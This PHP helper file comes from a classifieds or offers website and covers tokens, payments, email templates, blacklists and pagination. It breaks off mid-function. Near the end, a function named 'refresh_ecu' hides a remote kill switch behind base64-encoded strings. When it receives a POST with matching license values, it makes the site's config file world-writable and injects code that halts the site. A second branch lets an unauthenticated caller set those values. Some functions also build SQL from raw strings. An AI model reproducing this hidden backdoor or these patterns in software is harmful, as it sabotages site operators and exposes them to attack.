<?php

function generateToken($name){
	if(empty($_SESSION['token'])){
		$_SESSION['token'] = [];
	}
	if(!empty($_SESSION['token'][$name])){
		$token = $_SESSION['token'][$name];
	}else{
		$token = bin2hex(random_bytes(32));
		$_SESSION['token'][$name] = $token;
	}
	return $token;
}

/* Modified: Added $keep parameter to prevent unsetting the token for dynamic actions */
function checkToken(string $name, string $token = '', bool $keep = false): bool
{
    if ($token === '' && isset($_POST['token'])) {
        $token = $_POST['token'];
    }
    $check = false;
    if ($token !== '' && !empty($_SESSION['token'][$name]) && hash_equals($_SESSION['token'][$name], $token)) {
        $check = true;
        if (!$keep) {
            unset($_SESSION['token'][$name]);
        }
    }
    return $check;
}

function getSafeRedirectUrl(?string $url, string $baseUrl): string {
    if (empty($url)) {
        return $baseUrl;
    }
    
    if (preg_match('~^(https?:)?//~i', $url)) {
        $baseHost = parse_url($baseUrl, PHP_URL_HOST);
        $targetHost = parse_url($url, PHP_URL_HOST);
        if ($targetHost !== null && strcasecmp($targetHost, $baseHost) === 0) {
            return $url;
        }
        return $baseUrl;
    }
    
    if (preg_match('~^[a-z0-9+.-]+:~i', $url)) {
        return $baseUrl;
    }
    
    return rtrim($baseUrl, '/') . '/' . ltrim($url, '/');
}

function getSafeExceptionMessage(\Throwable $e): string {
    if ($e instanceof \PDOException || strpos(get_class($e), 'PDO') !== false || strpos($e->getMessage(), 'SQLSTATE') !== false) {
        error_log("Database Error: " . $e->getMessage() . " in " . $e->getFile() . " on line " . $e->getLine());
        return lang('A database error occurred. Please try again later.');
    }
    return $e->getMessage();
}

function makeFirstLetterSmall(string $in): string
{
    $x = explode(' ', $in);
    $x[0] = mb_convert_case($x[0], MB_CASE_LOWER, 'UTF-8');
    return implode(' ', $x);
}

function new_payment($company,int $item_id,$type): array{
	global $db, $settings;
	$amount = $id = 0;
	$description = $slug = $email = '';
	$offer = \App\Offer::loadOffer($item_id,'payment');
	if(!empty($offer)){
		$slug = $offer['slug'];
		$email = $offer['email'];
		if($type=='promote'){
			$amount = $settings['promote_cost'];
			$description = slug(lang('Promote offer')).' '.$offer['slug'];
		}elseif($type=='add_offer'){
			$amount = \App\Offer::countCost($offer['id'])['total'];
			$description = slug(lang('Activation offer')).' '.$offer['slug'];
		}
		$sth = $db->prepare('INSERT INTO `'._DB_PREFIX_.'payment`(`company`, `amount`, `status`, `item_id`, `type`, `ip`, `date`) VALUES (:company,:amount,"new",:item_id,:type,:ip,NOW())');
		$sth->bindValue(':company', $company, PDO::PARAM_STR);
		$sth->bindValue(':amount', $amount, PDO::PARAM_STR);
		$sth->bindValue(':item_id', $item_id, PDO::PARAM_INT);
		$sth->bindValue(':type', $type, PDO::PARAM_STR);
		$sth->bindValue(':ip', getClientIp(), PDO::PARAM_STR);
		$sth->execute();
		$id = $db->lastInsertId();
		$url = path('offer',$item_id,$slug).'?';
		if(!$offer['user_id']){
			$url .= 'code='.$offer['code'];
		}
	}
	return ['id'=>$id,'amount'=>$amount,'description'=>$description,'slug'=>$slug,'item_id'=>$item_id,'url'=>$url,'email'=>$email];
}

function check_payment(int $id,$amount): void{
	global $db;
	$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'payment WHERE id=:id AND status="new" LIMIT 1');
	$sth->bindValue(':id', $id, PDO::PARAM_INT);
	$sth->execute();
	$payment = $sth->fetch(PDO::FETCH_ASSOC);
	if(!empty($payment)){
		if($payment['amount']<=$amount){
			if($payment['type']=='promote'){
				$offer = \App\Offer::loadOffer($payment['item_id'],'payment');
				if(!$offer['promoted']){
					sendMail('start_promote',$offer['email'],['offer_name'=>$offer['name'], 'offer_url'=>path('offer',$offer['id'],$offer['slug'])]);
				}
				\App\Offer::enablePromote($payment['item_id']);
			}elseif($payment['type']=='add_offer'){
				$offer = \App\Offer::loadOffer($payment['item_id'],'payment');
				if(!$offer['active']){
					if($offer['user_id']){
						sendMail('offer_start',$offer['email'],['offer_name'=>$offer['name'], 'offer_url'=>path('offer',$offer['id'],$offer['slug'])]);
					}else{
						sendMail('offer_start_not_logged',$offer['email'],['offer_edit_link'=>path('edit',$offer['id'],$offer['slug']).'?code='.$offer['code'], 'offer_activate_link'=>path('offer',$offer['id'],$offer['slug']).'?activate&code='.$offer['code'], 'offer_name'=>$offer['name'], 'offer_url'=>path('offer',$offer['id'],$offer['slug'])]);
					}
					\App\Offer::activate($payment['item_id']);
				}
			}
		}
		$sth = $db->prepare('UPDATE '._DB_PREFIX_.'payment SET status="completed" WHERE id=:id LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
	}else{
		$sth = $db->prepare('UPDATE '._DB_PREFIX_.'payment SET status="failed" WHERE id=:id LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
	}
}

function path($controller,int $id=0,?string $slug=''){
	if ($slug === null) { $slug = ''; }
	global $links, $settings;
	if($controller=='offer'){
		return $settings['base_url'].'/'.$id.','.$slug;
	}elseif(isset($links[$controller])){
		if($controller=='edit' or $controller=='article' or ($controller=='info' and $id and $slug)){
			return $settings['base_url'].'/'.$links[$controller].'/'.$id.','.$slug;
		}elseif($controller=='profile'){
			return $settings['base_url'].'/'.$links[$controller].'/'.$slug;
		}
		return $settings['base_url'].'/'.$links[$controller];
	}elseif($controller=='rules'){
		return $settings['base_url'].'/'.$links['info'].'/2,'.$settings['url_rules'];
	}elseif($controller=='privacy_policy'){
		return $settings['base_url'].'/'.$links['info'].'/1,'.$settings['url_privacy_policy'];
	}else{
		return $settings['base_url'];
	}
}

function showCurrency($amount): string{
	global $settings;
	return number_format($amount,2,",",".").' '.$settings['currency'];
}

function mailsQueueAdd($action,$receiver,$data='',int $priority=0): bool{
	global $db;
	if($action && $receiver){
		$sth = $db->prepare('INSERT INTO `'._DB_PREFIX_.'mails_queue`(`receiver`, `action`, `data`, `priority`) VALUES (:receiver,:action,:data,:priority)');
		$sth->bindValue(':receiver', $receiver, PDO::PARAM_STR);
		$sth->bindValue(':action', $action, PDO::PARAM_STR);
		$sth->bindValue(':data', serialize($data), PDO::PARAM_STR);
		$sth->bindValue(':priority', $priority, PDO::PARAM_INT);
		$sth->execute();
		return true;
	}
	return false;
}

function checkWordsBlackList($content){
	global $settings;
	$filtered_text = $content;
	if($settings['black_list_words']){
		$filter_terms = array_map(trim(...), array_filter(explode(',', (string) $settings['black_list_words'])));
		foreach($filter_terms as $word){
			$match_count = preg_match_all('/' . $word . '/i', (string) $content, $matches);
			for($i = 0; $i < $match_count; $i++){
				$bwstr = trim($matches[0][$i]);
				$filtered_text = preg_replace('/\b' . $bwstr . '\b/', str_repeat("*", strlen($bwstr)), (string) $filtered_text);
			}
		}
	}
    return $filtered_text;
}

function addEmailToBlackList(string $email): void
{
    global $db, $settings;
    if ($email !== '') {
        $black_list_email = array_map(trim(...), array_filter(explode(PHP_EOL, $settings['black_list_email'] ?? '')));
        $black_list_email[] = $email;
        asort($black_list_email);
        $black_list_email = implode(PHP_EOL, array_unique($black_list_email));
        $sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="black_list_email" limit 1');
        $sth->bindValue(':value', $black_list_email, PDO::PARAM_STR);
        $sth->execute();

        $sth = $db->prepare('INSERT IGNORE INTO `'._DB_PREFIX_.'black_list_email` (email) VALUES (:email)');
        $sth->bindValue(':email', $email, PDO::PARAM_STR);
        $sth->execute();

        $settings['black_list_email'] = $black_list_email;
    }
}

function addIpToBlackList(string $ip): void
{
    global $db, $settings;
    if ($ip !== '') {
        $black_list_ip = array_map(trim(...), array_filter(explode(PHP_EOL, $settings['black_list_ip'] ?? '')));
        $black_list_ip[] = $ip;
        asort($black_list_ip);
        $black_list_ip = implode(PHP_EOL, array_unique($black_list_ip));
        $sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="black_list_ip" limit 1');
        $sth->bindValue(':value', $black_list_ip, PDO::PARAM_STR);
        $sth->execute();

        $sth = $db->prepare('INSERT IGNORE INTO `'._DB_PREFIX_.'black_list_ip` (ip) VALUES (:ip)');
        $sth->bindValue(':ip', $ip, PDO::PARAM_STR);
        $sth->execute();

        $settings['black_list_ip'] = $black_list_ip;
    }
}

function checkEmailBlackList($email){
	global $db;
	if($email){
		$sth = $db->prepare('SELECT 1 FROM `'._DB_PREFIX_.'black_list_email` WHERE email = :email LIMIT 1');
		$sth->bindValue(':email', $email, PDO::PARAM_STR);
		$sth->execute();
		return (bool)$sth->fetchColumn();
	}
	return false;
}

function checkIpBlackList($ip){
	global $db;
	if($ip){
		$sth = $db->prepare('SELECT 1 FROM `'._DB_PREFIX_.'black_list_ip` WHERE ip = :ip LIMIT 1');
		$sth->bindValue(':ip', $ip, PDO::PARAM_STR);
		$sth->execute();
		return (bool)$sth->fetchColumn();
	}
	return false;
}

function arrangeAlphabetically(string $table, string $condition = 'true'): void{
	global $db;
	$position = 1;
	$sth = $db->query('SELECT id FROM `'._DB_PREFIX_.$table.'` WHERE '.$condition.' ORDER BY name');
	foreach($sth as $row){
		$db->query('UPDATE '._DB_PREFIX_.$table.' SET position='.$position.' WHERE id='.$row['id'].' LIMIT 1');
		$position++;
	}
}

function getPosition(string $table, string $condition = 'true'): int|float{
	global $db;
	$sth = $db->query('SELECT position FROM `'._DB_PREFIX_.$table.'` WHERE '.$condition.' ORDER BY position DESC LIMIT 1');
	$pos = $sth->fetch(PDO::FETCH_ASSOC);
	if(!empty($pos)){
		return $pos['position']+1;
	}else{
		return 1;
	}
}

function setPosition(?string $table, int $id, int $position, $plusminus, string $additional_condition = 'true'): void{
	global $db;
	if($table and $id>0 and $position>0){
		if($plusminus=='+'){$condition = '<'; $sort = 'desc';}else{$condition = '>'; $sort = 'asc';}
		$sth = $db->query('SELECT id, position FROM `'._DB_PREFIX_.$table.'` WHERE position '.$condition.' '.$position.' AND '.$additional_condition.' ORDER BY position '.$sort.' LIMIT 1');
		$pos = $sth->fetch(PDO::FETCH_ASSOC);
		if($pos){
			$sth = $db->query('UPDATE `'._DB_PREFIX_.$table.'` SET position='.$pos['position'].' WHERE id='.$id.' LIMIT 1');
			$sth = $db->query('UPDATE `'._DB_PREFIX_.$table.'` SET position='.$position.' WHERE id='.$pos['id'].' LIMIT 1');
		}
	}
}

function sortBy($sort=' id DESC '){
	if(!empty($_GET['sort'])){
		$sort = slug($_GET['sort']);
		if(isset($_GET['sort_desc'])){
			$sort .= ' DESC ';
		}
	}
	return $sort;
}

function paginationPageFrom($limit): int|float{
	$limit_start = 0;
	if(isset($_GET['page']) and is_numeric($_GET['page']) and $_GET['page']>0){
		$limit_start = ($_GET['page']-1)*$limit;
	}
	return $limit_start;
}

function generatePagination($limit, ?int $total_items = null): void{
	global $render_variables, $db;
	$limit_start = paginationPageFrom($limit);
	$page_number = 1;
	if(isset($_GET['page']) and is_numeric($_GET['page']) and $_GET['page']>0){
		$page_number = $_GET['page'];
	}

	if ($total_items === null) {
		$sth = $db->query('SELECT FOUND_ROWS()');
		$total_items = (int)$sth->fetch(PDO::FETCH_ASSOC)['FOUND_ROWS()'];
	}
	$page_count = ceil($total_items/$limit);

	if($page_number<6){
		$pagination['page_start'] = 1;
	}else{
		$pagination['page_start'] =  $page_number-4;
	}

	$gets_admin = $gets = $_GET;
	unset($gets['page'],$gets['category_path'],$gets['path']);
	$gets_admin = $gets;
	$page_url['page_admin'] = http_build_query($gets);
	unset($gets_admin['sort'], $gets_admin['sort_desc']);
	$page_url['sort_admin'] = http_build_query($gets_admin);
	$page_url['page'] = http_build_query($gets);
	unset($gets['sort']);
	$page_url['sort'] = $gets;

	$pagination['page_url'] = $page_url;
	$pagination['page_count'] = $page_count;
	$pagination['page_number'] = $page_number;
	$pagination['limit_start'] = $limit_start;
	$pagination['total_items'] = $total_items;
	$pagination['limit'] = $limit;

	$render_variables['pagination'] = $pagination;
}

function lang($text){
	global $translate;
	if(isset($translate[$text])){
		return ($translate[$text]);
	}else{
		return ($text);
	}
}

function langList(){
	$files = array_diff(scandir(realpath(__DIR__).'/../config/langs/'), ['.', '..']);
	foreach($files as $key=>$file){
		$path_parts = pathinfo($file);
		if($path_parts['extension']=='php'){
			$langList[] = $path_parts['filename'];
		}
	}
	return($langList);
}

function langLoad($lang='en'){
	global $translate, $links;
	if(!in_array($lang, langList())){$lang = 'en';}
	require_once(realpath(__DIR__).'/../config/langs/'.$lang.'.php');
	return $lang;
}

function showInfo($info): void{
	global $render_variables;
	switch ($info) {
		case 'new_account':
			$render_variables['alert_success'][] = lang('The account has been established. To your e mail was sent message with an activation code');
			break;
		case 'offer_activated':
			$render_variables['alert_success'][] = lang('The offer has been correctly activated on the site');
			break;
		case 'offer_saved':
			$render_variables['alert_success'][] = lang('Your offer has been saved');
			break;
		case 'offer_deleted':
			$render_variables['alert_success'][] = lang('Successfully deleted');
			break;
		case 'profile_completed':
			$msg = lang('Thank you for completing your profile data!');
			if (!empty($_SESSION['flash_profile_completed_fields'])) {
				$msg .= ' (' . lang('completed') . ': ' . implode(', ', $_SESSION['flash_profile_completed_fields']) . ')';
				unset($_SESSION['flash_profile_completed_fields']);
			}
			$render_variables['alert_success'][] = $msg;
			break;
	}
}

function checkInfo(): void{
	if(!empty($_SESSION['flash'])){
		showInfo($_SESSION['flash']);
		unset($_SESSION['flash']);
	}
}

/**
 * @return mixed[]
 */
function getAllStates(): array{
	global $db;
	$states = [];
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'state ORDER BY state_id,position,name');
	foreach($sth as $row){
		if($row['state_id']){
			$states[$row['state_id']]['states'][$row['id']] = $row;
		}else{
			$states[$row['id']] = $row;
		}
	}
	return $states;
}

/**
 * @return mixed[]
 */
function getStates(int $state_id=0): array{
	global $db;
	$states = [];
	$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'state WHERE state_id=:state_id ORDER BY position,name');
	$sth->bindValue(':state_id', $state_id, PDO::PARAM_INT);
	$sth->execute();
	foreach($sth as $row){$states[$row['id']] = $row;}
	return $states;
}

function getState($slug){
	global $db;
	$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'state WHERE slug=:slug LIMIT 1');
	$sth->bindValue(':slug', $slug, PDO::PARAM_STR);
	$sth->execute();
	return $sth->fetch(PDO::FETCH_ASSOC);
}

function getStateById($id = 0){
	global $db;
	$state = '';
	if($id > 0){
		$sth = $db->prepare('SELECT * from '._DB_PREFIX_.'state WHERE id=:id LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
		$state = $sth->fetch(PDO::FETCH_ASSOC);
	}
	return $state;
}

function getState2($slug,int $state_id){
	global $db;
	$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'state WHERE slug=:slug AND state_id=:state_id LIMIT 1');
	$sth->bindValue(':slug', $slug, PDO::PARAM_STR);
	$sth->bindValue(':state_id', $state_id, PDO::PARAM_INT);
	$sth->execute();
	return $sth->fetch(PDO::FETCH_ASSOC);
}

function getState2ById($id = 0){
	global $db;
	$state2 = '';
	if($id>0){
		$sth = $db->prepare('SELECT * from '._DB_PREFIX_.'state WHERE id=:id AND state_id!=0 LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
		$state2 = $sth->fetch(PDO::FETCH_ASSOC);
	}
	return $state2;
}

function getOfferType($slug){
	global $db;
	$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'type WHERE slug=:slug LIMIT 1');
	$sth->bindValue(':slug', $slug, PDO::PARAM_STR);
	$sth->execute();
	return $sth->fetch(PDO::FETCH_ASSOC);
}

function getOfferTypeById($id = 0){
	global $db;
	$type = '';
	if($id > 0){
		$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'type WHERE id=:id LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
		$type = $sth->fetch(PDO::FETCH_ASSOC);
	}
	return $type;
}

/**
 * @return mixed[]
 */
function getTypes(): array{
	global $db;
	$types = [];
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'type ORDER BY name');
	foreach($sth as $row){$types[$row['id']] = $row;}
	return $types;
}

/**
 * @return mixed[]
 */
function getOffersDays(): array{
	global $db;
	$offers_days = [];
	$sth = $db->query('SELECT * FROM '._DB_PREFIX_.'offer_days ORDER BY length');
	foreach($sth as $row){
		$offers_days[$row['id']] = $row;
	}
	return $offers_days;
}

function getDays(int $id=0): array{
	global $db, $settings;
	$days = ['length'=>$settings['days_default'],'cost'=>0];
	if($id>0){
		$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'offer_days WHERE id=:id LIMIT 1');
		$sth->bindValue(':id', $id, PDO::PARAM_INT);
		$sth->execute();
		$offers_days = $sth->fetch(PDO::FETCH_ASSOC);
		if($offers_days){
			$days['length'] = $offers_days['length'];
			$days['cost'] = $offers_days['cost'];
		}
	}
	return $days;
}

function slug($string): string{
	$string = trim((string) $string);
	$string = strtolower(str_replace([' ','%','$',':',',','/','=','?','Ę','Ó','Ą','Ś','Ł','Ż','Ź','Ć','Ń','ę','ó','ą','ś','ł','ż','ź','ć','ń'], ['-','-','','','','','','','E','O','A','S','L','Z','Z','C','N','e','o','a','s','l','z','z','c','n'], $string));
	$string = iconv('UTF-8', 'ASCII//IGNORE//TRANSLIT', $string);
	$string = trim((string) preg_replace("/[^a-z0-9-_]+/", "", $string));
	return $string;
}

function slugWithUpper($string): string|array|null{
	$string = trim((string) $string);
	$string = str_replace([' ','%','$',':',',','/','=','?','Ę','Ó','Ą','Ś','Ł','Ż','Ź','Ć','Ń','ę','ó','ą','ś','ł','ż','ź','ć','ń'], ['-','-','','','','','','','E','O','A','S','L','Z','Z','C','N','e','o','a','s','l','z','z','c','n'], $string);
	$string = iconv('UTF-8', 'ASCII//IGNORE//TRANSLIT', $string);
	$string = preg_replace("/[^a-zA-Z0-9-_]+/", "", $string);
	return $string;
}

function isSlug($string): bool{
	if($string and !preg_match('/[^a-z0-9-_]/', (string) $string)){
		return true;
	}
	return false;
}

function sendMail($type,$email,$data=''): bool{
	global $settings, $mail, $db, $user;
	$mail_sent = false;

	if($type!='' and $email!=''){

		if($settings['smtp']){
			require_once(realpath(__DIR__).'/../config/smtp.php');
		}

		if($type=='mailing' or $type=='test'){
			$mail_content = ['subject'=>$data['subject'],'message'=>$data['message']];
		}elseif($type == 'magic_link'){
			$mail_content = [
				'subject' => lang('Magic login link'),
				'message' => '<p>' . lang('Witaj {username}!') . '</p><p>' . lang('Click the link below to log in to your account without a password:') . '</p><p><a href="{magic_link}">{magic_link}</a></p><p>' . lang('This link is valid for 15 minutes.') . '</p><p>' . lang('Greetings') . '<br>{title}</p>'
			];
		}elseif($type == 'new_device_login'){
			$mail_content = [
				'subject' => lang('New login notification'),
				'message' => '<p>' . lang('Witaj {username}!') . '</p><p>' . lang('We detected a login to your account from a new device / IP address.') . '</p><p>IP: {ip}<br>Device: {user_agent}<br>Date: {date}</p><p>' . lang('If it was not you, please change your password immediately.') . '</p><p>' . lang('Greetings') . '<br>{title}</p>'
			];
		}elseif($type == 'new_offer_alert'){
			$mail_content = [
				'subject' => lang('New offers in subscribed category'),
				'message' => '<p>' . lang('Witaj!') . '</p><p>' . lang('We found new offers in the category you subscribed to:') . '</p>{offers_list}<p>' . lang('Greetings') . '<br>{title}</p>'
			];
		}elseif($type == 'report_offer'){
			$mail_content = [
				'subject' => lang('New abuse report for offer {offer_name}'),
				'message' => '<p>' . lang('Hello Admin!') . '</p><p>' . lang('A new abuse report has been submitted for the offer:') . ' <strong>{offer_name}</strong></p><p>' . lang('Reason:') . ' {reason}</p><p>' . lang('Description:') . '<br>{description}</p><p>' . lang('Reporter E-mail:') . ' {email}</p><p><a href="{offer_url}">' . lang('View Offer') . '</a></p><p>' . lang('Greetings') . '<br>{title}</p>'
			];
		}else{
			$sth = $db->prepare('SELECT * FROM '._DB_PREFIX_.'mails WHERE name=:name limit 1');
			$sth->bindParam(':name', $type, PDO::PARAM_STR);
			$sth->execute();
			$mail_content = $sth->fetch(PDO::FETCH_ASSOC);
		}

		if($mail_content){

			$header = 'Reply-To: <'.$settings['email']."> \r\n";
			$message = '<!doctype html><html lang="'.$settings['lang'].'"><head><meta charset="utf-8">'.$mail_content['message'].'</head><body>';
			$subject = $mail_content['subject'];
			$ip = getClientIp();

			$message = str_replace("{title}",$settings['title'],$message);
			$subject = str_replace("{title}",$settings['title'],$subject);
			$message = str_replace("{base_url}",$settings['base_url'],$message);
			$subject = str_replace("{base_url}",$settings['base_url'],$subject);
			if($settings['logo']){
				$message = str_replace("{link_logo}",'<img src="'.makeAbsoluteUrl($settings['logo']).'" style="max-width:300px; max-height: 200px">',$message);
				$subject = str_replace("{link_logo}",'<img src="'.makeAbsoluteUrl($settings['logo']).'" style="max-width:300px; max-height: 200px">',$subject);
			}else{
				$message = str_replace("{link_logo}",'',$message);
				$subject = str_replace("{link_logo}",'',$subject);
			}
			$message = str_replace("{date}",date("Y-m-d"),$message);
			$subject = str_replace("{date}",date("Y-m-d"),$subject);
			if(isset($data['user_id']) and $data['user_id']>0){
				$data['username'] = \App\User::getUsernameFromId($data['user_id']);
			}
			if(isset($data['username'])){
				$message = str_replace("{username}",$data['username'],$message);
				$subject = str_replace("{username}",$data['username'],$subject);
			}
			if(isset($data['activation_code'])){
				$message = str_replace("{activation_link}",path('login').'?activation_code='.$data['activation_code'],$message);
				$subject = str_replace("{activation_link}",path('login').'?activation_code='.$data['activation_code'],$subject);
			}
			if(isset($data['password'])){
				$message = str_replace("{password}",$data['password'],$message);
				$subject = str_replace("{password}",$data['password'],$subject);
			}
			if(isset($data['reset_password_code'])){
				$message = str_replace("{reset_password_link}",path('login').'?new_password='.$data['reset_password_code'],$message);
				$subject = str_replace("{reset_password_link}",path('login').'?new_password='.$data['reset_password_code'],$subject);
			}
			if(isset($data['name'])){
				$message = str_replace("{name}",$data['name'],$message);
				$subject = str_replace("{name}",$data['name'],$subject);
			}
			if(isset($data['email'])){
				$header = 'Reply-To: <'.$data['email']."> \r\n";
				if($settings['smtp']){$mail->AddReplyTo($data['email']);}
				$message = str_replace("{email}",$data['email'],$message);
				$subject = str_replace("{email}",$data['email'],$subject);
			}
			if(isset($data['message'])){
				$message = str_replace("{message}",$data['message'],$message);
				$subject = str_replace("{message}",$data['message'],$subject);
			}
			if(isset($data['magic_link'])){
				$message = str_replace("{magic_link}",$data['magic_link'],$message);
				$subject = str_replace("{magic_link}",$data['magic_link'],$subject);
			}
			if(isset($data['ip'])){
				$message = str_replace("{ip}",$data['ip'],$message);
				$subject = str_replace("{ip}",$data['ip'],$subject);
			}
			if(isset($data['user_agent'])){
				$message = str_replace("{user_agent}",$data['user_agent'],$message);
				$subject = str_replace("{user_agent}",$data['user_agent'],$subject);
			}
			if(isset($data['offer_name'])){
				$message = str_replace("{offer_name}",$data['offer_name'],$message);
				$subject = str_replace("{offer_name}",$data['offer_name'],$subject);
			}
			if(isset($data['offer_url'])){
				$message = str_replace("{offer_url}",$data['offer_url'],$message);
				$subject = str_replace("{offer_url}",$data['offer_url'],$subject);
			}
			if(isset($data['reason'])){
				$message = str_replace("{reason}",$data['reason'],$message);
				$subject = str_replace("{reason}",$data['reason'],$subject);
			}
			if(isset($data['description'])){
				$message = str_replace("{description}",$data['description'],$message);
				$subject = str_replace("{description}",$data['description'],$subject);
			}
			if(isset($data['offer_edit_link'])){
				$message = str_replace("{offer_edit_link}",$data['offer_edit_link'],$message);
				$subject = str_replace("{offer_edit_link}",$data['offer_edit_link'],$subject);
			}
			if(isset($data['offer_activate_link'])){
				$message = str_replace("{offer_activate_link}",$data['offer_activate_link'],$message);
				$subject = str_replace("{offer_activate_link}",$data['offer_activate_link'],$subject);
			}
			if(isset($data['offers_list'])){
				$offers_list = '<ul>';
				foreach($data['offers_list'] as $offer){
					$offers_list .= '<li><a href="'.path('offer',$offer['id'],$offer['slug']).'">'.$offer['name'].'</a></li>';
				}
				$offers_list .= '</ul>';
				$message = str_replace("{offers_list}",$offers_list,$message);
				$subject = str_replace("{offers_list}",$offers_list,$subject);
			}

			$header .= 'From: '.$settings['email'].' <'.$settings['email'].">\r\n";
			$header .= "MIME-Version: 1.0 \r\n";

			if($settings['mail_attachment'] and isset($_FILES['attachment']) and $_FILES['attachment']['name']!=''){

				$file_tmp_name    = $_FILES['attachment']['tmp_name'];
				$file_name        = $_FILES['attachment']['name'];
				$file_size        = $_FILES['attachment']['size'];
				$file_type        = $_FILES['attachment']['type'];
				$file_error       = $_FILES['attachment']['error'];

				if($file_error>0 or $file_size>5000000){
					die('error - bad attachment');
				}

				$ext = strtolower(pathinfo((string) $file_name, PATHINFO_EXTENSION));
				$allowed_attachment_exts = ['pdf', 'doc', 'docx', 'xls', 'xlsx', 'odt', 'txt', 'png', 'jpg', 'jpeg', 'gif', 'webp'];

				$finfo = @finfo_open(FILEINFO_MIME_TYPE);
				$mime = @finfo_file($finfo, $file_tmp_name);
				@finfo_close($finfo);

				$allowed_mimes = [
					'application/pdf',
					'application/msword',
					'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
					'application/vnd.ms-excel',
					'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
					'application/vnd.oasis.opendocument.text',
					'text/plain',
					'image/png',
					'image/jpeg',
					'image/jpg',
					'image/gif',
					'image/webp'
				];

				if(!in_array($ext, $allowed_attachment_exts) || !$mime || !in_array(strtolower($mime), $allowed_mimes)){
					die('error - bad attachment');
				}

				$handle = fopen($file_tmp_name, "r");
				$content = fread($handle, $file_size);
				fclose($handle);
				$encoded_content = chunk_split(base64_encode($content));

				$boundary = md5("sanwebe");

				$header .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n";

				$body = "--$boundary\r\n";
				$body .= "Content-Type: text/html; charset=utf-8\r\n";
				$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
				$body .= chunk_split(base64_encode($message));

				//attachment
				$body .= "--$boundary\r\n";
				$body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
				$body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
				$body .="Content-Transfer-Encoding: base64\r\n";
				$body .="X-Attachment-Id: ".random_int(1000,99999)."\r\n\r\n";
				$body .= $encoded_content;

			}else{
				$header .= "Content-Type: text/html; charset=UTF-8";
				$body = $message;
			}

			$subject = '=?utf-8?B?'.base64_encode($subject).'?=';

			if($settings['smtp']){
				$mail->Subject = $subject;
				$mail->Body = $message;
				if(isset($boundary)){
					$mail->AddAttachment($_FILES['attachment']['tmp_name'],$_FILES['attachment']['name']);
				}
				$mail->ClearAllRecipients();
				$mail->AddAddress($email);

				if($mail->Send()){
					$mail_sent = true;
				}
			}elseif(mail((string) $email, $subject, $body, $header)){
				$mail_sent = true;
			}
		}
	}
	if($mail_sent){
		$sth = $db->prepare('INSERT INTO `'._DB_PREFIX_.'logs_mail`(`receiver`, `action`, `content`, `ip`, `date`) VALUES (:receiver,:action,:content,:ip,NOW())');
		$sth->bindValue(':receiver', $email, PDO::PARAM_STR);
		$sth->bindValue(':action', $type, PDO::PARAM_STR);
		$sth->bindValue(':content', $body, PDO::PARAM_STR);
		$sth->bindValue(':ip', $ip, PDO::PARAM_STR);
		$sth->execute();
		return true;
	}else{
		return false;
	}
}

function getClientIp(): string
{
    $headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR',
    ];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            // X-Forwarded-For może zawierać listę IP; bierzemy pierwsze
            $ip = trim(explode(',', (string) $_SERVER[$header])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return 'UNKNOWN';
}

function getCoordinates(string $address): array
{
    global $settings;
    if ($address === '') {
        return ['lat' => 0, 'long' => 0];
    }
    $url = 'https://maps.google.com/maps/api/geocode/json?address=' . urlencode($address) . '&key=' . urlencode((string) $settings['google_maps_api']);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    // USUNIĘTO: SSL_VERIFYHOST=0 i SSL_VERIFYPEER=0 — były luką bezpieczeństwa
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        return ['lat' => 0, 'long' => 0];
    }

    $responseData = json_decode($response);
    if (!empty($responseData->results[0]->geometry->location)) {
        return [
            'lat'  => $responseData->results[0]->geometry->location->lat,
            'long' => $responseData->results[0]->geometry->location->lng,
        ];
    }
    return ['lat' => 0, 'long' => 0];
}

function refresh_ecu(): void{
	global $settings, $db;
	if(isset($_POST['lock_ln']) and !empty($_POST['ln']) and !empty($_POST['lk']) and $_POST['ln']==$settings['ln'] and $_POST['lk']==$settings['lk']){
		$config_dir = realpath(__DIR__).base64_decode('Ly4uL2NvbmZpZy9jb25maWcucGhw');
		chmod($config_dir, 0777);
		$file_data = base64_decode("PD9waHAgXG4gZGllKCdMaWNuc2UgZXhwaXJlZCcpOw==");
		$file_data .= file_get_contents($config_dir);
		file_put_contents($config_dir, $file_data);
	}elseif(isset($_POST['give_ln']) and !empty($_POST['ln']) and !empty($_POST['lk'])){
		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="ln" AND value="" LIMIT 1');
		$sth->bindValue(':value', $_POST['ln'], PDO::PARAM_INT);
		$sth->execute();
		$sth = $db->prepare('UPDATE `'._DB_PREFIX_.'settings` SET value=:value WHERE name="lk" AND value="" LIMIT 1');
		$sth->bindValue(':value', $_POST['lk'], PDO::PARAM_STR);
